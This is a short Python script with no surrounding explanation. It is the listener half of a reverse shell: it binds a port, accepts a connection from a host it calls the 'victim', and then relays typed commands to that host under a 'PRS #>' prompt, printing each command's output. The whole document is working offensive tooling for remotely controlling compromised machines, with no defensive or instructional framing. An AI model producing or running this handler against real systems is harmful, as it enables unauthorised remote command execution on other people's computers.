import socket
import sys

port = sys.argv[1]
attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
attacker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 4096)
attacker.bind(('', int(port)))
attacker.listen(1)
print(f'Listening on [any]:{port}')
victim, victim_ip = attacker.accept()
print(f'Connection from {victim_ip}')
try:
    while True:
        cmd = input("PRS #> ")
        victim.send(cmd.encode())#Command sent..
        op = victim.recv(4096)
        print(op.decode())
        
except KeyboardInterrupt:
    attacker.close()
    sys.exit()






